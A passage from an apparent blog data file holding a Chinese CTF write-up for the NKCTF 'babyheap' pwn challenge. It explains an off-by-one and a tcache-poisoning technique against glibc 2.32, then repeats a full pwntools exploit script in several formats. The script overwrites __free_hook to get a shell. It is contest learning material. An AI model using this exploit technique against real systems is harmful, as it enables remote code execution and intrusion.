class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"nkctf_babyrop","date":"2023-03-26T14:12:09.000Z","_content":"\nnkctf的babyheap，用的glibc2.32，与前面的版本相比在`tcache`中加入的异或加密。这里的`tcache`也有了计数器，会记录`chunk`的个数。\n\n但因为本地没有2.32的包，有点难调试，先按2.31写了再改为2.32的打远程。\n\n<!-- more -->\n\n在`my_read`里面有`off by one`。\n\n思路挺常规的，先用`unsorted bin`泄露`libcbase`和`heapbase`，之后通过`off by one`修改`size`造成`overlapping`，通过修改`tcache`中`chunk`的`fd`指向`__free_hook`来把`__free_hook`申请出来，修改为`system`。\n\n只是glibc2.32要注意`tcache`的异或加密，`new_fd=fd^(heapbase>>12)`。\n\n这里的`tcache`也有了计数器，会记录`chunk`的个数，不过只要多释放一个再改第一个的`fd`就好了。\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n# libc=ELF('../story_attachment/libc.so.6') #local\nlibc=ELF(\"./libc-2.32.so\") # remote\n# p=process('./'+filename)\np=remote('node2.yuzhian.com.cn',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef add(idx,size):\n    ru(\"Your choice: \")\n    sl(\"1\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n    ru(\"Enter the Size: \")\n    sl(str(size))\n\ndef delete(idx):\n    ru(\"Your choice: \")\n    sl(\"2\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n\ndef edit(idx,content):\n    ru(\"Your choice: \")\n    sl(\"3\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n    ru(\"Enter the content: \")\n    s(content)\n\ndef show(idx):\n    ru(\"Your choice: \")\n    sl(\"4\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n\nadd(0,0x28)\nadd(1,0x28)\nadd(2,0x80)\nfor i in range(8):\n    add(i+3,0x80)\nadd(11,0x28)\n\npayload=b'a'*0x28+b'\\x61'\nedit(0,payload)\ndelete(1)\nadd(1,0x58)\n\n# leak heap_base and libc\nfor i in range(3,10):\n    delete(i)\n    \ndelete(2)\ndelete(10)\n\npayload=b'a'*0x30+b'\\n'\nedit(1,payload)\nshow(1)\nru('\\n')\n\n# pause()\n# sleep(0.1)\n\nlibc_addr=(uu64(ru('\\n')[:-1])<<8)\nlibcbase=libc_addr-0x60-0x10-libc.sym['__malloc_hook']\nleak(\"libcbase\",hex(libcbase))\nleak(\"libc_addr\",hex(libc_addr))\npause()\n\nfree_hook=libcbase+libc.sym['__free_hook']\n\npayload=b'a'*0x37+b'\\n'\nedit(1,payload)\nshow(1)\nru(\"\\n\")\nheap_addr=uu64(ru(\"\\n\")[:-1])\nheapbase=(heap_addr>>12)<<12\n\nleak(\"libcbase\",hex(libcbase))\nleak(\"heapbase\",hex(heapbase))\n\npayload=b'a'*0x28+p64(0x90)+p64(libc_addr)+p64(heapbase+0x770)+b'\\n'\nedit(1,payload)\n\nfor i in range(7):\n    add(i+3,0x80)\n\nadd(10,0x80)\n# leak(\"libcbase\",hex(libcbase))\n# leak(\"heapbase\",hex(heapbase))\n# debug()\nadd(2,0x80)\n\ndelete(10)\ndelete(2)\npayload=b'a'*0x28+p64(0x90)+p64(free_hook^(heapbase>>12))+p64(heapbase+0x770)+b'\\n'\nedit(1,payload)\nadd(12,0x80)\nadd(2,0x80)\n\n# overwrite free_hook\npayload=p64(libcbase+libc.sym['system'])+b'\\n'\nedit(2,payload)\nedit(12,b\"/bin/sh\\x00\\n\")\ndelete(12)\n\nitr()\n```\n\n","source":"_posts/nkctf_babyheap.md","raw":"---\ntitle: nkctf_babyrop\ndate: 2023-03-26 22:12:09\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n\n\n---\n\nnkctf的babyheap，用的glibc2.32，与前面的版本相比在`tcache`中加入的异或加密。这里的`tcache`也有了计数器，会记录`chunk`的个数。\n\n但因为本地没有2.32的包，有点难调试，先按2.31写了再改为2.32的打远程。\n\n<!-- more -->\n\n在`my_read`里面有`off by one`。\n\n思路挺常规的，先用`unsorted bin`泄露`libcbase`和`heapbase`，之后通过`off by one`修改`size`造成`overlapping`，通过修改`tcache`中`chunk`的`fd`指向`__free_hook`来把`__free_hook`申请出来，修改为`system`。\n\n只是glibc2.32要注意`tcache`的异或加密，`new_fd=fd^(heapbase>>12)`。\n\n这里的`tcache`也有了计数器，会记录`chunk`的个数，不过只要多释放一个再改第一个的`fd`就好了。\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n# libc=ELF('../story_attachment/libc.so.6') #local\nlibc=ELF(\"./libc-2.32.so\") # remote\n# p=process('./'+filename)\np=remote('node2.yuzhian.com.cn',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef add(idx,size):\n    ru(\"Your choice: \")\n    sl(\"1\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n    ru(\"Enter the Size: \")\n    sl(str(size))\n\ndef delete(idx):\n    ru(\"Your choice: \")\n    sl(\"2\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n\ndef edit(idx,content):\n    ru(\"Your choice: \")\n    sl(\"3\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n    ru(\"Enter the content: \")\n    s(content)\n\ndef show(idx):\n    ru(\"Your choice: \")\n    sl(\"4\")\n    ru(\"Enter the index: \")\n    sl(str(idx))\n\nadd(0,0x28)\nadd(1,0x28)\nadd(2,0x80)\nfor i in range(8):\n    add(i+3,0x80)\nadd(11,0x28)\n\npayload=b'a'*0x28+b'\\x61'\nedit(0,payload)\ndelete(1)\nadd(1,0x58)\n\n# leak heap_base and libc\nfor i in range(3,10):\n    delete(i)\n    \ndelete(2)\ndelete(10)\n\npayload=b'a'*0x30+b'\\n'\nedit(1,payload)\nshow(1)\nru('\\n')\n\n# pause()\n# sleep(0.1)\n\nlibc_addr=(uu64(ru('\\n')[:-1])<<8)\nlibcbase=libc_addr-0x60-0x10-libc.sym['__malloc_hook']\nleak(\"libcbase\",hex(libcbase))\nleak(\"libc_addr\",hex(libc_addr))\npause()\n\nfree_hook=libcbase+libc.sym['__free_hook']\n\npayload=b'a'*0x37+b'\\n'\nedit(1,payload)\nshow(1)\nru(\"\\n\")\nheap_addr=uu64(ru(\"\\n\")[:-1])\nheapbase=(heap_addr>>12)<<12\n\nleak(\"libcbase\",hex(libcbase))\nleak(\"heapbase\",hex(heapbase))\n\npayload=b'a'*0x28+p64(0x90)+p64(libc_addr)+p64(heapbase+0x770)+b'\\n'\nedit(1,payload)\n\nfor i in range(7):\n    add(i+3,0x80)\n\nadd(10,0x80)\n# leak(\"libcbase\",hex(libcbase))\n# leak(\"heapbase\",hex(heapbase))\n# debug()\nadd(2,0x80)\n\ndelete(10)\ndelete(2)\npayload=b'a'*0x28+p64(0x90)+p64(free_hook^(heapbase>>12))+p64(heapbase+0x770)+b'\\n'\nedit(1,payload)\nadd(12,0x80)\nadd(2,0x80)\n\n# overwrite free_hook\npayload=p64(libcbase+libc.sym['system'])+b'\\n'\nedit(2,payload)\nedit(12,b\"/bin/sh\\x00\\n\")\ndelete(12)\n\nitr()\n```\n\n","slug":"nkctf_babyheap","published":1,"updated":"2023-03-30T08:13:14.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czag9004r5oud4xyyf4jz","content":"<p>nkctf的babyheap，用的glibc2.32，与前面的版本相比在<code>tcache</code>中加入的异或加密。这里的<code>tcache</code>也有了计数器，会记录<code>chunk</code>的个数。</p>\n<p>但因为本地没有2.32的包，有点难调试，先按2.31写了再改为2.32的打远程。</p>\n<span id=\"more\"></span>\n\n<p>在<code>my_read</code>里面有<code>off by one</code>。</p>\n<p>思路挺常规的，先用<code>unsorted bin</code>泄露<code>libcbase</code>和<code>heapbase</code>，之后通过<code>off by one</code>修改<code>size</code>造成<code>overlapping</code>，通过修改<code>tcache</code>中<code>chunk</code>的<code>fd</code>指向<code>__free_hook</code>来把<code>__free_hook</code>申请出来，修改为<code>system</code>。</p>\n<p>只是glibc2.32要注意<code>tcache</code>的异或加密，<code>new_fd=fd^(heapbase&gt;&gt;12)</code>。</p>\n<p>这里的<code>tcache</code>也有了计数器，会记录<code>chunk</code>的个数，不过只要多释放一个再改第一个的<code>fd</code>就好了。</p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;../story_attachment/libc.so.6&#x27;) #local</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.32.so&quot;</span>) <span class=\"comment\"># remote</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node2.yuzhian.com.cn&#x27;</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the Size: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the content: &quot;</span>)</span><br><span class=\"line\">    s(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Your choice: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&quot;Enter the index: &quot;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">3</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">11</span>,<span class=\"number\">0x28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+<span class=\"string\">b&#x27;\\x61&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">0x58</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap_base and libc</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">    delete(i)</span><br><span class=\"line\">    </span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">delete(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x30</span>+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"><span class=\"comment\"># sleep(0.1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr=(uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])&lt;&lt;<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase=libc_addr-<span class=\"number\">0x60</span>-<span class=\"number\">0x10</span>-libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libc_addr&quot;</span>,<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x37</span>+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">heap_addr=uu64(ru(<span class=\"string\">&quot;\\n&quot;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">heapbase=(heap_addr&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;heapbase&quot;</span>,<span class=\"built_in\">hex</span>(heapbase))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x90</span>)+p64(libc_addr)+p64(heapbase+<span class=\"number\">0x770</span>)+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">3</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"><span class=\"comment\"># leak(&quot;libcbase&quot;,hex(libcbase))</span></span><br><span class=\"line\"><span class=\"comment\"># leak(&quot;heapbase&quot;,hex(heapbase))</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">10</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x90</span>)+p64(free_hook^(heapbase&gt;&gt;<span class=\"number\">12</span>))+p64(heapbase+<span class=\"number\">0x770</span>)+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">12</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># overwrite free_hook</span></span><br><span class=\"line\">payload=p64(libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>])+<span class=\"string\">b&#x27;\\n&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)</span><br><span class=\"line\">edit(<span class=\"number\">12</span>,<span class=\"string\">b&quot;/bin/sh\\x00\\n&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf的babyheap，用的glibc2.32，与前面的版本相比在<code>tcache</code>中加入的异或加密。这里的<code>tcache</code>也有了计数器，会记录<code>chunk</code>的个数。</p>\n<p>但因为本地没有2.32的包，有点难调试，先按2.31写了再改为2.32的打远程。</p>","more":"<p>在<code>my_read</code>里面有<code>off by one</code>。</p>\n<p>思路挺常规的，先用<code>unsorted bin</code>泄露<code>libcbase</code>和<code>heapbase</code>，之后通过<code>off by one</code>修改<code>size</code>造成<code>overlapping</code>，通过修改<code>tcache</code>中<code>chunk</code>的<code>fd</code>指向<code>__free_hook</code>来把<code>__free_hook</code>申请出来，修改为<code>system</code>。</p>\n<p>只是glibc2.32要注意<code>tcache</code>的异或加密，<code>new_fd=fd^(heapbase&gt;&gt;12)</code>。</p>\n<p>这里的<code>tcache</code>也有了计数器，会记录<code>chunk</code>的个数，不过只要多释放一个再改第一个的<code>fd</code>就好了。</p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;../story_attachment/libc.so.6&#x27;) #local</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.32.so&quot;</span>) <span class=\"comment\"># remote</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node2.yuzhian.com.cn&#x27;</span>,)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               